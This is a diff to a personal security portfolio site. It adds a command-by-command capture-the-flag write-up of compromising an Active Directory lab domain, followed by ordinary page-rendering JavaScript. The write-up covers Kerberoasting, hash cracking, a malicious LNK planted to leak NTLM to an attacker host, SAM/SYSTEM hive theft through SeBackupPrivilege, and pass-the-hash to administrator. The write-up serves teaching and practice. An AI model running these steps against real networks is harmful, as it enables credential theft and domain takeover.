@@ -475,4 +475,428 @@ EXEC xp_cmdshell 'C:\\Users\\Public\\w.exe -cmd "net localgroup administrators &
         <li>A Python Werkzeug web app on port 8080, titled "Building Magic Application Portal"</li>
       </ul>
 
-      <h2>Initial access: validating leaked credentials</h
+      <h2>Initial access: validating leaked credentials</h2>
+      <p>The leaked database uses unsalted hashes, which lookup services such as CrackStation resolve immediately. Two entries cracked:</p>
+      <table>
+        <thead><tr><th>Username</th><th>Name</th><th>Role</th><th>Password</th></tr></thead>
+        <tbody>
+          <tr><td><code>r.widdleton</code></td><td>Ron Widdleton</td><td>Intern Builder</td><td>[redacted]</td></tr>
+          <tr><td><code>t.ren</code></td><td>Theodore Ren</td><td>Safety Officer</td><td>[redacted]</td></tr>
+        </tbody>
+      </table>
+      <p>Validate both credential sets with NetExec. <code>t.ren</code> returned <code>STATUS_LOGON_FAILURE</code>, so the chain proceeds with <code>r.widdleton</code>:</p>
+      <div class="code-wrap">
+        <pre><code class="language-bash">nxc smb dc01.buildingmagic.local -u r.widdleton -p &lt;PASSWORD&gt; --shares</code></pre>
+      </div>
+      <p>Authentication succeeds and enumerates the shares, including <code>File-Share</code>, the company's central file repository.</p>
+      <figure>
+        <img src="images/nxc-shares.png" alt="NetExec output confirming r.widdleton and listing the shares">
+        <figcaption>Figure 1: NetExec output confirming r.widdleton and listing the shares.</figcaption>
+      </figure>
+
+      <h2>Domain mapping with BloodHound</h2>
+      <p>Collect domain data for BloodHound with the valid account:</p>
+      <div class="code-wrap">
+        <pre><code class="language-bash">nxc ldap dc01.buildingmagic.local -u 'r.widdleton' -p '&lt;PASSWORD&gt;' --bloodhound -ns dc01.buildingmagic.local --collection All</code></pre>
+      </div>
+      <figure>
+        <img src="images/bloodhound-graph.png" alt="BloodHound graph of the collected data">
+        <figcaption>Figure 2: BloodHound graph of the collected data.</figcaption>
+      </figure>
+
+      <h2>Kerberoasting: recovering r.haggard's password</h2>
+      <p>Any authenticated domain user can request service tickets for SPN-bearing accounts. The LDAP query identified <code>r.haggard</code> as a candidate, so request its TGS hash:</p>
+      <div class="code-wrap">
+        <pre><code class="language-bash">nxc ldap dc01.buildingmagic.local -u 'r.widdleton' -p '&lt;PASSWORD&gt;' --kerberoast output.txt</code></pre>
+      </div>
+      <p>The password has not rotated since May 2025. Crack the offline TGS-REP hash with Hashcat mode 13100 (etype 23):</p>
+      <div class="code-wrap">
+        <pre><code class="language-bash">hashcat -m 13100 krb.txt /usr/share/wordlists/rockyou.txt</code></pre>
+      </div>
+      <p>The hash cracks to a cleartext password, giving control of <code>r.haggard</code>.</p>
+
+      <h2>Lateral movement: remote password reset</h2>
+      <p>With <code>r.haggard</code>'s credentials, a remote password reset is possible via <code>net rpc password</code>:</p>
+      <div class="code-wrap">
+        <pre><code class="language-bash">net rpc password "TargetUser" "&lt;NEW_PASSWORD&gt;" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"</code></pre>
+      </div>
+      <p>This yields access to <code>h.potch</code>, which carries a weak password.</p>
+
+      <h2>NTLM theft via a malicious LNK file</h2>
+      <p><code>h.potch</code> has write access to <code>File-Share</code>. The NetExec slinky module plants a shortcut referencing the attacker's host; when a user browses the share, Windows authenticates to the listener and leaks the NTLM challenge response:</p>
+      <div class="code-wrap">
+        <pre><code class="language-bash">nxc smb dc01.buildingmagic.local -u h.potch -p &lt;PASSWORD&gt; -M slinky -o NAME=important SERVER=&lt;attacker_IP&gt; SHARE=File-Share</code></pre>
+      </div>
+      <p>Run Responder to capture the callback. The NetNTLMv2 response belongs to <code>h.grangon</code>; crack it offline with Hashcat mode 5600 (NetNTLMv2):</p>
+      <div class="code-wrap">
+        <pre><code class="language-bash">hashcat -m 5600 ntlmv2.txt /usr/share/wordlists/rockyou.txt</code></pre>
+      </div>
+      <p>The cracked cleartext gives control of <code>h.grangon</code>.</p>
+
+      <h2>Access as h.grangon and SeBackupPrivilege abuse</h2>
+      <p>Authenticate over WinRM with the recovered credentials:</p>
+      <div class="code-wrap">
+        <pre><code class="language-bash">evil-winrm -i dc01.buildingmagic.local -u h.grangon -p &lt;PASSWORD&gt;</code></pre>
+      </div>
+      <p><code>whoami /priv</code> confirms SeBackupPrivilege on <code>h.grangon</code>. This permits reading any file irrespective of ACLs, so the registry hives containing local account hashes can be exported:</p>
+      <div class="code-wrap">
+        <pre><code class="language-powershell">reg save hklm\\sam C:\\Users\\h.grangon\\Desktop\\sam
+reg save hklm\\system C:\\Users\\h.grangon\\Desktop\\system</code></pre>
+      </div>
+      <p>Exfiltrate both hives with Evil-WinRM's <code>download</code> command and extract the local hashes offline.</p>
+      <figure>
+        <img src="images/whoami-priv.png" alt="whoami /priv output showing SeBackupPrivilege">
+        <figcaption>Figure 3: whoami /priv output showing SeBackupPrivilege.</figcaption>
+      </figure>
+
+      <h2>Pass-the-hash: access as a.flatch</h2>
+      <p>The <code>a.flatch</code> NT hash is reused, allowing authentication without the plaintext password:</p>
+      <div class="code-wrap">
+        <pre><code class="language-bash">evil-winrm -u 'a.flatch' -H '&lt;NT_hash&gt;' -i dc01.buildingmagic.local</code></pre>
+      </div>
+      <h2>Extracting local hashes from the SAM and SYSTEM hives</h2>
+      <p>From the <code>h.grangon</code> session, <code>SeBackupPrivilege</code> lets us read the SAM and SYSTEM hives regardless of their ACLs. Confirm the privilege first:</p>
+      <div class="code-wrap">
+        <pre><code class="language-powershell">whoami /priv</code></pre>
+      </div>
+      <p>Export both hives, then download them with Evil-WinRM. The SYSTEM hive can take a while to transfer.</p>
+      <div class="code-wrap">
+        <pre><code class="language-powershell">reg save HKLM\\SAM "C:\\Users\\h.grangon\\Documents\\SAM"
+reg save HKLM\\SYSTEM "C:\\Users\\h.grangon\\Documents\\SYSTEM"</code></pre>
+      </div>
+      <p>Extract the local account hashes offline with Impacket's <code>secretsdump</code>:</p>
+      <div class="code-wrap">
+        <pre><code class="language-bash">secretsdump.py -sam './SAM' -system './SYSTEM' LOCAL</code></pre>
+      </div>
+      <p>The recovered local Administrator NT hash fails with <code>wmiexec.py</code>, <code>psexec.py</code> and Evil-WinRM. Rather than stop there, test it against every account from the RID brute-force list:</p>
+      <div class="code-wrap">
+        <pre><code class="language-bash">nxc smb BUILDINGMAGIC.LOCAL -u users.txt -H &lt;NT_hash&gt; --continue-on-success</code></pre>
+      </div>
+      <p><code>a.flatch</code> accepts the hash and also has Administrator rights.</p>
+
+      <h2>Administrator access on DC01</h2>
+      <p>Authenticate as <code>a.flatch</code> with the hash and read the final flag from the Administrator desktop:</p>
+      <div class="code-wrap">
+        <pre><code class="language-bash">evil-winrm -i dc01.buildingmagic.local -u a.flatch -H &lt;NT_hash&gt;</code></pre>
+      </div>
+      <p>The root flag is located at <code>C:\\Users\\Administrator\\Desktop\\root.txt</code>.</p>
+
+    `
+  },
+];
+
+/* Blog posts: { id, title, date, author, summary, tags[], body (HTML) } */
+const POSTS = [
+];
+
+/* About page HTML */
+const ABOUT_HTML = `
+  <h1>About</h1>
+  <p class="lead">Add a short introduction here.</p>
+`;
+
+/* Contact links: { label, url } */
+const CONTACT_LINKS = [
+  { label: "LinkedIn", url: "https://www.linkedin.com/in/damianpolomski" },
+];
+
+/* ============================================================
+   RENDERING (no code below needs editing)
+   ============================================================ */
+
+const $ = (sel) => document.querySelector(sel);
+
+function esc(str) {
+  return String(str ?? "").replace(/[&<>"']/g, c => ({
+    "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;"
+  }[c]));
+}
+const yearOf = (item) => String(item.date).slice(0, 4);
+const tagsHTML = (tags = []) => `<div class="tags">${tags.map(t => `<span class="tag">${esc(t)}</span>`).join("")}</div>`;
+const emptyMsg = (msg) => `<p class="empty">${msg}</p>`;
+
+/* ---------- Router state ---------- */
+let projectFilter = "all";
+let searchQuery = "";
+
+function parseRoute() {
+  const hash = location.hash.replace(/^#/, "");
+  const [a, b] = hash.split("/");
+  if (a === "writeup") { const item = WRITEUPS.find(w => w.id === b); if (item) return { view: "writeup", item }; }
+  if (a === "post")    { const item = POSTS.find(p => p.id === b);    if (item) return { view: "post", item }; }
+  if (["projects", "blog", "about", "contact"].includes(a)) return { view: a };
+  return { view: "home" };
+}
+
+/* ---------- Top nav ---------- */
+function renderTopNav(route) {
+  const links = [["projects", "Projects"], ["blog", "Blog"], ["about", "About"], ["contact", "Contact"]];
+  $("#top-nav").innerHTML = links.map(([k, l]) =>
+    `<a href="#${k}" class="${route.view === k ? "active" : ""}">${l}</a>`).join("");
+}
+
+/* ---------- Sidebar ---------- */
+function renderSidebar(route) {
+  const q = searchQuery.trim().toLowerCase();
+  const match = (t) => !q || String(t).toLowerCase().includes(q);
+
+  const groups = {};
+  WRITEUPS.filter(w => match(w.title) || match(w.platform)).forEach(w => {
+    (groups[w.platform] ||= {});
+    (groups[w.platform][yearOf(w)] ||= []).push(w);
+  });
+
+  const writeupBlocks = Object.entries(groups).map(([platform, years]) => `
+    <div class="side-section">
+      <div class="side-label">${esc(platform)}</div>
+      ${Object.entries(years).map(([yr, items]) => `
+        <div class="side-year">${esc(yr)}</div>
+        <div class="side-children">
+          ${items.map(w => `<a class="side-link ${route.view === "writeup" && route.item.id === w.id ? "active" : ""}"
+             href="#writeup/${esc(w.id)}">${esc(w.title)}</a>`).join("")}
+        </div>`).join("")}
+    </div>`).join("");
+
+  const postLinks = POSTS.filter(p => match(p.title)).map(p => `
+    <a class="side-link ${route.view === "post" && route.item.id === p.id ? "active" : ""}"
+       href="#post/${esc(p.id)}">${esc(p.title)}</a>`).join("");
+
+  const noResults = q && !writeupBlocks && !postLinks
+    ? `<p class="no-results">No matches for "${esc(searchQuery)}".</p>` : "";
+
+  $("#side").innerHTML = `
+    <div class="side-section">
+      <a class="side-link ${route.view === "home" ? "active" : ""}" href="#home">Home</a>
+      <a class="side-link ${route.view === "projects" ? "active" : ""}" href="#projects">Projects</a>
+    </div>
+    ${writeupBlocks}
+    ${postLinks ? `<div class="side-section"><div class="side-label">Blog</div>${postLinks}</div>` : ""}
+    ${noResults}
+  `;
+}
+
+/* ---------- Views ---------- */
+function projectCard(p) {
+  return `
+    <div class="card">
+      <div class="kicker">${esc(p.date)} · ${esc(p.category)}</div>
+      <h3>${esc(p.title)}</h3>
+      <p>${esc(p.summary)}</p>
+      ${tagsHTML(p.tags)}
+      ${p.repo ? `<a class="more" href="${esc(p.repo)}">Source →</a>` : ""}
+    </div>`;
+}
+
+function viewHome() {
+  const writeups = WRITEUPS.length
+    ? `<div class="cards">${WRITEUPS.map(w => `
+        <div class="card">
+          <div class="kicker">${esc(w.platform)} · ${esc(w.difficulty)} · ${esc(w.date)}</div>
+          <h3><a href="#writeup/${esc(w.id)}">${esc(w.title)}</a></h3>
+          <p>${esc(w.summary)}</p>
+          <a class="more" href="#writeup/${esc(w.id)}">Read →</a>
+        </div>`).join("")}</div>`
+    : emptyMsg("No write-ups yet.");
+
+  const projects = PROJECTS.length
+    ? `<div class="cards">${PROJECTS.slice(0, 3).map(projectCard).join("")}</div>`
+    : emptyMsg("No projects yet.");
+
+  return `
+    <h1>Writeups</h1>
+    <p class="lead">Projects, CTF and lab write-ups, and notes on breaking things so they stay fixed. Pick a write-up from the sidebar.</p>
+    <h2>Latest write-ups</h2>
+    ${writeups}
+    <h2>Recent projects</h2>
+    ${projects}
+  `;
+}
+
+function viewProjects() {
+  const cats = ["all", ...new Set(PROJECTS.map(p => p.category))];
+  const list = PROJECTS.filter(p => projectFilter === "all" || p.category === projectFilter);
+  const body = list.length
+    ? `<div class="cards">${list.map(projectCard).join("")}</div>`
+    : emptyMsg(PROJECTS.length ? "No projects in this category yet." : "No projects yet.");
+  return `
+    <h1>Projects</h1>
+    <p class="lead">Tools, labs and experiments.</p>
+    <div class="filters">
+      ${cats.map(c => `<button class="filter-btn ${c === projectFilter ? "on" : ""}" data-cat="${esc(c)}">${esc(c)}</button>`).join("")}
+    </div>
+    ${body}
+  `;
+}
+
+function viewBlog() {
+  const body = POSTS.length
+    ? `<div class="cards">${POSTS.map(p => `
+        <div class="card">
+          <div class="kicker">${esc(p.date)}</div>
+          <h3><a href="#post/${esc(p.id)}">${esc(p.title)}</a></h3>
+          <p>${esc(p.summary)}</p>
+          <a class="more" href="#post/${esc(p.id)}">Read →</a>
+        </div>`).join("")}</div>`
+    : emptyMsg("No posts yet.");
+  return `
+    <h1>Blog</h1>
+    <p class="lead">Longer posts on techniques, research and lessons learned.</p>
+    ${body}
+  `;
+}
+
+function viewContact() {
+  const links = CONTACT_LINKS.length
+    ? `<div class="about-links">${CONTACT_LINKS.map(l => `<a href="${esc(l.url)}">${esc(l.label)}</a>`).join("")}</div>`
+    : emptyMsg("No contact links yet.");
+  return `
+    <h1>Contact</h1>
+    <p class="lead">Add your preferred links below, or an email address you're happy to share publicly.</p>
+    ${links}
+  `;
+}
+
+function viewArticle(kind, item) {
+  const isWriteup = kind === "writeup";
+  const crumb = isWriteup
+    ? `${esc(item.platform)} / ${esc(item.date)}`
+    : `Blog / ${esc(item.date)}`;
+
+  const linkCard = isWriteup && item.link ? `
+    <a class="link-card" href="${esc(item.link.url)}">
+      <div>
+        <div class="lc-title">${esc(item.link.title)}</div>
+        <div class="lc-url">${esc(item.link.url.replace(/^https?:\/\//, "").replace(/\/$/, ""))}</div>
+      </div>
+      <span class="chev">›</span>
+    </a>` : "";
+
+  const subtitle = isWriteup ? `${esc(item.difficulty)} · by ${esc(item.author)}` : `by ${esc(item.author)}`;
+
+  const summaryBlock = !isWriteup
+    ? `<details class="summary-box" open><summary>Summary</summary><div>${esc(item.summary)}</div></details>`
+    : "";
+
+  return `
+    <div class="article-top">
+      <div class="crumbs"><a href="#${isWriteup ? "home" : "blog"}">${isWriteup ? "Writeups" : "Blog"}</a> &nbsp;›&nbsp; ${crumb}</div>
+      <div class="page-actions"><button class="btn-copy" id="copy-link">Copy link</button></div>
+    </div>
+    <h1>${esc(item.title)}</h1>
+    <p class="subtitle">${subtitle}</p>
+    ${tagsHTML(item.tags)}
+    ${linkCard}
+    ${summaryBlock}
+    <div class="article-body">${item.body}</div>
+    <div class="article-footer">
+      <span style="color:var(--muted)">Last updated ${esc(item.date)}</span>
+      <a href="#${isWriteup ? "home" : "blog"}">← Back</a>
+    </div>
+  `;
+}
+
+/* ---------- Enhancements ---------- */
+function addCopyButtons(root) {
+  root.querySelectorAll("pre").forEach(pre => {
+    if (pre.querySelector(".copy-btn")) return;
+    const btn = document.createElement("button");
+    btn.className = "copy-btn";
+    btn.textContent = "Copy";
+    btn.addEventListener("click", async () => {
+      try { await navigator.clipboard.writeText(pre.innerText); btn.textContent = "Copied"; }
+      catch (_) { btn.textContent = "Failed"; }
+      setTimeout(() => (btn.textContent = "Copy"), 1500);
+    });
+    pre.appendChild(btn);
+  });
+}
+
+function wireCopyLink() {
+  const b = document.getElementById("copy-link");
+  if (!b) return;
+  b.addEventListener("click", async () => {
+    try { await navigator.clipboard.writeText(location.href); b.textContent = "Copied"; }
+    catch (_) { b.textContent = "Failed"; }
+    setTimeout(() => (b.textContent = "Copy link"), 1500);
+  });
+}
+
+function buildToc(root) {
+  const tocEl = $("#toc");
+  const heads = root.querySelectorAll(".article-body h2, .article-body h3");
+  if (!heads.length) { tocEl.innerHTML = ""; return; }
+  heads.forEach((h, i) => { if (!h.id) h.id = "sec-" + i; });
+  tocEl.innerHTML = `<div class="toc-title">On this page</div>` +
+    Array.from(heads).map(h =>
+      `<a class="${h.tagName.toLowerCase()}" data-target="${h.id}" href="#${h.id}">${esc(h.textContent)}</a>`
+    ).join("");
+}
+
+function highlightToc() {
+  const links = document.querySelectorAll("#toc a");
+  if (!links.length) return;
+  let current = null;
+  links.forEach(a => {
+    const el = document.getElementById(a.dataset.target);
+    if (el && el.getBoundingClientRect().top <= 120) current = a.dataset.target;
+  });
+  links.forEach(a => a.classList.toggle("current", a.dataset.target === current));
+}
+
+/* ---------- Render ---------- */
+function render() {
+  const route = parseRoute();
+  renderTopNav(route);
+  renderSidebar(route);
+
+  const main = $("#main");
+  let html;
+  switch (route.view) {
+    case "writeup": html = viewArticle("writeup", route.item); break;
+    case "post":    html = viewArticle("post", route.item); break;
+    case "projects": html = viewProjects(); break;
+    case "blog":    html = viewBlog(); break;
+    case "about":   html = ABOUT_HTML; break;
+    case "contact": html = viewContact(); break;
+    default:        html = viewHome();
+  }
+  main.innerHTML = html;
+
+  if (route.view === "writeup" || route.view === "post") {
+    buildToc(main);
+    wireCopyLink();
+  } else {
+    $("#toc").innerHTML = "";
+  }
+  addCopyButtons(main);
+  window.scrollTo({ top: 0 });
+  $("#side").classList.remove("open");
+}
+
+/* ---------- Events ---------- */
+document.addEventListener("click", e => {
+  const filter = e.target.closest("[data-cat]");
+  if (filter) { projectFilter = filter.dataset.cat; render(); }
+});
+
+$("#search").addEventListener("input", e => {
+  searchQuery = e.target.value;
+  renderSidebar(parseRoute());
+});
+
+$("#menu-btn").addEventListener("click", () => $("#side").classList.toggle("open"));
+
+$("#toc").addEventListener("click", e => {
+  const a = e.target.closest("a[data-target]");
+  if (!a) return;
+  e.preventDefault();
+  const el = document.getElementById(a.dataset.target);
+  if (el) el.scrollIntoView({ behavior: "smooth", block: "start" });
+});
+window.addEventListener("hashchange", render);
+window.addEventListener("scroll", highlightToc, { passive: true });
+
+render();
+</script>
+</body>
+</html>
